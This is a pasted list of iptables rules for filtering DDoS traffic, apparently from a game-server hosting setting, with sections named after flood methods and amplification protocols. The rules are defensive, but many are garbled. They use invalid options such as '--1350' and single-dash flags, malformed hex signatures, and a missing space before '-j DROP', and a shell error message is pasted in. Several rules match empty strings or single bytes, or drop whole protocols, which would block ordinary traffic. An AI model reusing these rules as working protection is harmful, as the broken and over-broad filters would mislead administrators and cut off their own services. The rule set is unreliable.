iptables -A INPUT -p udp -i eth0 ! -s 0.0.0.0/0 --dport 33848 -j DROP

-----------------------------------
-----------------------------------
OVH-KILLERV4
-----------------------------------
iptables -t mangle -A PREROUTING -s 192.41.230.134 -j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 121 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p tcp -i eth0 ! -s 0.0.0.0/0 --dport 7001 -j DROP
BLOCK SOURCE PORT
iptables -A OUTPUT -p tcp --dport 14335 -j DROP
iptables -t mangle -A PREROUTING -s 134.107.3.41 -j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 121 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p udp -i eth0 ! -s 0.0.0.0/0 --dport 7001 -j DROP
BLOCK SOURCE PORT3
iptables -A OUTPUT -p udp --dport 14335 -j DROP

-----------------------------------
-----------------------------------
NFO-BYE
-----------------------------------
iptables -t mangle -A PREROUTING -s 106.108.20.227 -j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 60 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p tcp -i eth0 ! -s 0.0.0.0/0 --dport 5901 -j DROP

-----------------------------------
-----------------------------------
UDPBYPASS
-----------------------------------
iptables -t raw -I PREROUTING -p udp -m udp -m string --hex-string '|75a800|' --algo kmp -j DROP
iptables -t mangle -A PREROUTING -s 243.45.216.58-j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 49 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p udp -i eth0 ! -s 0.0.0.0/0 --dport 39356 -j DROP
BLOCK SOURCE PORT
iptables -A OUTPUT -p udp --dport 5353 -j DROP
iptables -t mangle -A PREROUTING -s 133.154.184.21 -j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 190 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p udp -i eth0 ! -s 0.0.0.0/0 --dport 38815 -j DROP
BLOCK SOURCE PORT3
iptables -A OUTPUT -p udp --dport 9987 -j DROP

-----------------------------------
-----------------------------------
OVH-EVIL
-----------------------------------
iptables -t mangle -A PREROUTING -s 162.254.193.47 -j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 446 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p udp -i eth0 ! -s 0.0.0.0/0 --dport 32733 -j DROP
BLOCK SOURCE PORT
iptables -A OUTPUT -p udp --dport 992 -j DROP

-----------------------------------
-----------------------------------
NTP
-----------------------------------
iptables -A INPUT -p udp --sport 123 -j ACCEPT
iptables -A OUTPUT -p udp --dport 123 -j ACCEPT

-----------------------------------
-----------------------------------
DNS
-----------------------------------
iptables -A INPUT -i eth0 -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p udp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --sport 53 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT

-----------------------------------
-----------------------------------
TS3
-----------------------------------
iptables -A PREROUTING -t raw -p udp --dport 9987 -m string --hex-string '|fa163eb402096ac8|' --algo kmp -j DROP
iptables -A PREROUTING -t raw -p udp --dport 9987 -m string --hex-string '|71f63813d5422309|' --algo kmp -j DROP

-----------------------------------
-----------------------------------
SYNFLOOD
-----------------------------------
iptables -A INPUT -p tcp ! --syn -m state --state NEW -j DROP
iptables -A INPUT -p TCP --syn -m iplimit --iplimit-above 9 -j DROP

-----------------------------------
-----------------------------------
XMAS
-----------------------------------
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

-----------------------------------
-----------------------------------
TCP
-----------------------------------
iptables -t raw -A PREROUTING -p tcp --sport 3072 -j DROP
iptables -t raw -A PREROUTING -p tcp --sport 3702 -j DROP

-----------------------------------
-----------------------------------
SSH BRUTEFORCE PROTECTION
-----------------------------------
iptables -A INPUT -p tcp --dport ssh -m conntrack --ctstate NEW -m recent --set
iptables -A INPUT -p tcp --dport ssh -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 10 -j DROP

-----------------------------------
-----------------------------------
UDP
-----------------------------------
iptables -I INPUT -p udp --dport 16000:29000 -m string --to 75 --algo bm --string 'HTTP/1.1 200 OK' -j DROP
iptables -I INPUT -p udp -m udp -m string --hex-string "|7374640000000000|" --algo kmp --from 28 --to 29 -j DROP
iptables -A INPUT -p udp -m u32 --u32 "6&0xFF=0,2:5,7:16,18:255" -j DROP
iptables -A INPUT -m u32 --u32 "12&0xFFFF=0xFFFF" -j DROP
iptables -A INPUT -m u32 --u32 "28&0x00000FF0=0xFEDFFFFF" -j DROP
iptables -A INPUT -m string --algo bm --from 28 --to 29 --string "farewell" -j DROP
iptables -A INPUT -p udp -m u32 --u32 "28 & 0x00FF00FF = 0x00200020 && 32 & 0x00FF00FF = 0x00200020 && 36 & 0x00FF00FF = 0x00200020 && 40 & 0x00FF00FF = 0x00200020" -j DROP
iptables -I INPUT -p udp -m udp -m string --hex-string "|53414d50|" --algo kmp --from 28 --to 29 -j DROP
iptables -A PREROUTING -t raw -p udp --dport 9987 -m length --length 0:32 -j DROP
iptables -A PREROUTING -t raw -p udp --dport 9987 -m length --length 2521:65535 -j DROP
iptables -A PREROUTING -t raw -p udp --dport 9987 -m length --length 98 -j DROP
iptables -t raw -A PREROUTING -p udp --dport 80 -j DROP
iptables -t raw -A PREROUTING -p udp --dport 443 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 37810 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 7001 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 17185 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 3072 -j DROP
iptables -t raw -A PREROUTING -p udp --sport 3702 -j DROP

-----------------------------------
-----------------------------------
SMTP-KILLER
-----------------------------------
iptables -t raw -A PREROUTING -p tcp -m multiport --sports 67,465 -j DROP

-----------------------------------
-----------------------------------
STD
-----------------------------------
iptables -A PREROUTING -t raw -p udp -m string --algo bm --string "hihelloowouwuqwqsrhgsuckmadickconsidertogoofflinetyvmdiegoofflineovh" -j DROP
-----------------------------------

-----------------------------------
-----------------------------------
UDPHEX
-----------------------------------
iptables -A PREROUTING -t raw -p udp -m string --algo bm --string "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/" -m length --length 1500 -j DROP
-----------------------------------

-----------------------------------
-----------------------------------
VSE
-----------------------------------
iptables -A PREROUTING -t raw -p udp -m string --algo bm --string "TSource Engine Query" -j DROP
iptables -t raw -A PREROUTING -p udp -m string --algo bm --string "\rules" -m length --length 49 -j DROP
iptables -t raw -A PREROUTING -p udp -m string --algo bm --string "\basic" -m length --length 49 -j DROP
iptables -t raw -A PREROUTING -p udp -m string --algo bm --string "\status" -m length --length 50 -j DROP
iptables -t raw -A PREROUTING -p udp -m string --algo bm --string "\players" -m length --length 51 -j DROP
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.43/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 51.222.71.20 
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.43/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 51.222.71.20
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.36/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 51.222.71.21 
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.36/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 51.222.71.21
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.80/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 51.222.71.22 
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.80/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 51.222.71.22
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.31/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 192.99.159.64 
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.31/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 192.99.159.64
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.30/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 192.99.159.65  
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.30/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 192.99.159.65
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.13/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 192.99.159.66  
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.13/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 192.99.159.66
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.32/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 192.99.159.67  
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.32/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 192.99.159.67
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.35/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 167.114.53.63  
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.35/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 167.114.53.63
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.44/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 51.222.71.23 
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.44/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 51.222.71.23
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.75/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 51.222.71.19 
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.75/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 51.222.71.19
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.83/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 54.39.226.239 
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.83/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 54.39.226.239
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.84/32 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 54.39.226.238 
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.84/32 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 54.39.226.238
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.0/24 -m multiport --sports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Source" -j SNAT --to-source 54.39.226.236-54.39.226.239
iptables -t nat -A POSTROUTING -p udp -s 10.8.0.0/24 -m multiport --dports 3074,3544,3478,3479,6672 -m comment --comment "UDP Gameports Destination" -j SNAT --to-source 54.39.226.236-54.39.226.239
-----------------------------------

-----------------------------------
PACKET CHECKERS
-----------------------------------
iptables -A CHECK1 -j DROP
iptables -N CHECK1
iptables -N CHECK1
iptables -A INPUT -p udp -m length --length 20 -j CHECK1
iptables -A CHECK1 -m recent --name longudp --rcheck 1 --hitcount 5 -j DROP
iptables -A CHECK1 -m recent --name longudp --1350 -j RETURN
iptables -N CHECK1
iptables -A INPUT -p udp -m length --length 20 -j CHECK1
iptables -A CHECK1 -m recent --name longudp --rcheck 1 --hitcount 5 -j DROP
iptables -A CHECK1 -m recent --name longudp --1460 -j RETURN
iptables -A INPUT -p all -m length --length 222
iptables -A CHECK1 -j DROP
iptables -N CHECK1
iptables -A INPUT -p all -m length --length 222
iptables -A CHECK1 -j DROP
iptables -N CHECK1
iptables -A INPUT -p all -m length --length 222
iptables -A CHECK1 -j DROP
iptables -N CHECK1
iptables -A INPUT -p all -m length --length 222
iptables -A CHECK1 -j DROP
iptables -N CHECK1
iptables: Chain already exists.
iptables -A INPUT -p all -m length --length 222
iptables -A INPUT -p all -m length --length 222
iptables -A CHECK1 -j DROP
iptables -N CHECK1

-----------------------------------
-----------------------------------
SECURITYTEAM METHOD PATCHES
-----------------------------------
iptables -A OUTPUT ! -s 127.198.148.58/32 ! -d 127.77.75.129/32 -p icmp -m icmp --icmp-type 3/3 -m connmark ! --mark 0x7ba5407d -j DROP
iptables -A OUTPUT ! -s 127.231.45.126/32 ! -d 127.20.246.233/32 -p tcp -m tcp --sport 61001:65535 --tcp-flags RST RST -m connmark ! --mark 0x407ee413 -j DROP
iptables -A INPUT -p tcp -ack -m length --length 52 -m string --algo bm --string "0x912e" -m state --state ESTABLISHED  -j DROP 
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -m limit --limit 50/s -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN FIN,SYN -m limit --limit 50/s -j DROP
iptables -A FORWARD -p tcp --syn -m limit --limit 1/s -j ACCEPT
iptables -A FORWARD -p tcp --tcp-flags SYN,ACK,FIN,RST RST -m limit --limit 1/s -j ACCEPT
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -m limit --limit 50/s -j ACCEPT
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP

-----------------------------------
-----------------------------------
HTTPFLOOD
-----------------------------------
iptables -N http-flood
iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 1 -j http-flood
iptables -A INPUT -p tcp --syn --dport 443 -m connlimit --connlimit-above 1 -j http-flood
iptables -A http-flood -m limit --limit 10/s --limit-burst 10 -j RETURN
iptables -A http-flood -m limit --limit 1/s --limit-burst 10 -j LOG --log-prefix "HTTP-FLOOD "

iptables -A http-flood -j DROP
-----------------------------------
-----------------------------------
FLOOD
-----------------------------------
iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 -j DROP
iptables -A INPUT -p tcp --syn --dport 443 -m connlimit --connlimit-above 20 -j DROP
iptables -A INPUT -p tcp --dport 80 -i eth0 -m state --state NEW -m recent --set
iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 10 --hitcount 20 -j DROP
iptables -A INPUT -p tcp --dport 443 -i eth0 -m state --state NEW -m recent --set
iptables -I INPUT -p tcp --dport 443 -m state --state NEW -m recent --update --seconds 10 --hitcount 20 -j DROP
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 13 -j DROP
iptables -N flood
iptables -A flood -j DROP

-----------------------------------
-----------------------------------
SYNFLOOD
-----------------------------------
iptables -t filter -N syn-flood
iptables -t filter -A INPUT -i eth0 -p tcp --syn -j syn-flood
iptables -t filter -A syn-flood -m limit --limit 1/sec --limit-burst 4 -j RETURN
iptables -t filter -A syn-flood -j DROP

-----------------------------------
-----------------------------------
PORTMAP, CHARGEN, NETBIOS, STEAMDISCOVER, vxWorks, WSD, Echo, ARD, SNMP, SIP, MSSQL, TFTP, LDAP, RIP
-----------------------------------
iptables -t raw -A PREROUTING -p udp -m multiport --sports 111,19,137,27036,17185,3702,7,3283,161,5060,1434,69,389,520 -j DROP

-----------------------------------
-----------------------------------
SENTINEL, DB2, AFS, MEMCACHED, Ubiquiti(UBNT), Amanda backup, Beckhoff TwinCAT,QUAKE3, Lantronix, Digiman, Crestron, Plex, QOTD, CoAP
-----------------------------------
iptables -t raw -A PREROUTING -p udp -m multiport --sports 5093,50000,7001,11211,10001,10080,48899,27960,30718,2362,41794,32414,17,5683 -j DROP

-----------------------------------
-----------------------------------
DVR DHCPDiscover, IPSec-IKE, Modbus, OpenVPN, Netis, NFS, Jenkins, bootp client, NTCP, BACnet
-----------------------------------
iptables -t raw -A PREROUTING -p udp -m multiport --sports 37810,500,502,1194,53413,2049,33848,68,524,47808,47811:47823 -j DROP

-----------------------------------
-----------------------------------
GRE
-----------------------------------
iptables -t raw -A PREROUTING -p gre -j DROP

-----------------------------------
-----------------------------------
ESP
-----------------------------------
iptables -t raw -A PREROUTING -p esp -j DROP

-----------------------------------
-----------------------------------
AH
-----------------------------------
iptables -t raw -A PREROUTING -p ah -j DROP

-----------------------------------
-----------------------------------
RANDOM TCP
-----------------------------------
iptables -A INPUT -p tcp -rst -m length --length 40 -m string --algo bm --string "0xd3da" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -ack -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -rst -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -syn -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -fin -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -psh -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -ack -m length --length 40 -m string --algo bm --string "0x38d3" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -rst -m length --length 40 -m string --algo bm --string "0x38d3" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -syn -m length --length 40 -m string --algo bm --string "0x38d3" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -fin -m length --length 40 -m string --algo bm --string "0x38d3" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -psh -m length --length 40 -m string --algo bm --string "0x38d3" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -ack -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -rst -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -syn -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -fin -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -psh -m length --length 40 -m string --algo bm --string "0x0c54" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -ack -m length --length 40 -m string --algo bm --string "0xd3da" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -rst -m length --length 40 -m string --algo bm --string "0xd3da" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -syn -m length --length 40 -m string --algo bm --string "0xd3da" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -fin -m length --length 40 -m string --algo bm --string "0xd3da" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -psh -m length --length 40 -m string --algo bm --string "0xd3da" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -ack -m length --length 40 -m string --algo bm --string "0x912e" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -rst -m length --length 40 -m string --algo bm --string "0x912e" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -syn -m length --length 40 -m string --algo bm --string "0x912e" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -fin -m length --length 40 -m string --algo bm --string "0x912e" -m state --state ESTABLISHED  -j DROP
iptables -A INPUT -p tcp -psh -m length --length 40 -m string --algo bm --string "0x912e" -m state --state ESTABLISHED  -j DROP

-----------------------------------
-----------------------------------
SAO-UDP
-----------------------------------
iptables -A INPUT -m string --algo bm --string "" -j DROP
iptables -A INPUT -m string --algo bm --string "U" -j DROP
iptables -A INPUT -m string --algo bm --string "UU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP
iptables -A INPUT -m string --algo bm --string "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU" -j DROP

-----------------------------------
-----------------------------------
OVH-SMACK
-----------------------------------
iptables -A INPUT -m string --algo bm --string "\x77" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6" -j DROP
iptables -A INPUT -m string --algo bm --string "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B" -j DROP

==============================================================
  _   _ _   _ ____  _   _ _     _        _    ____  _     _____ 
 | | | | \ | |  _ \| | | | |   | |      / \  | __ )| |   | ____|
 | | | |  \| | |_) | | | | |   | |     / _ \ |  _ \| |   |  _|  
 | |_| | |\  |  __/| |_| | |___| |___ / ___ \| |_) | |___| |___ 
  \___/|_| \_|_|    \___/|_____|_____/_/   \_\____/|_____|_____|
UNPULLABLE METHOD
==============================================================
iptables -I PREROUTING -t raw -p tcp --dport 1:65535 -m string --algo kmp --hex-string '|ff ff ff ff fd|' -j DROP
iptables -I PREROUTING -t raw -p tcp --dport 1:65535 -m string --algo kmp --hex-string '|ff ff ff ff fe|' -j DROP
iptables -I PREROUTING -t raw -p tcp --dport 1:65535 -m string --algo kmp --hex-string '|00 ff ff ff ff fd|' -j DROP
iptables -I PREROUTING -t raw -p tcp --dport 1:65535 -m string --algo kmp --hex-string '|00 ff ff ff ff fe|' -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp --hex-string '|ff ff ff ff fd|' -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp --hex-string '|ff ff ff ff fe|' -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp --hex-string '|00 ff ff ff ff fd|' -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp --hex-string '|00 ff ff ff ff fe|' -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp --hex-string '|0120 ff ff ff55 f4f f3e|' -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp --hex-string '|033 666ff ff4 ff ff fe|' -j DROP
iptables -I PREROUTING -t raw -p udp --dport 1:65535 -m string --algo kmp --hex-string '|0340 ff ff ff45 ff fe|' -j DROP
iptables -A INPUT -p udp -m multiport --dports 135,137,138,139,445,1433,1434 -j DROP
iptables -A INPUT -p tcp -m multiport --dports 135,137,138,139,445,1433,1434 -j DROP
iptables -A INPUT -p udp -m multiport --sports 135,137,138,139,445,1433,1434 -j DROP
iptables -A INPUT -p tcp -m multiport --sports 135,137,138,139,445,1433,1434 -j DROP 
iptables -A INPUT -p udp -m multiport --dports 853,4433,4740,5349,5684,5868,6514,6636,8232,10161 -j DROP
iptables -A INPUT -p tcp -m multiport --dports 853,4433,4740,5349,5684,5868,6514,6636,8232,10161 -j DROP
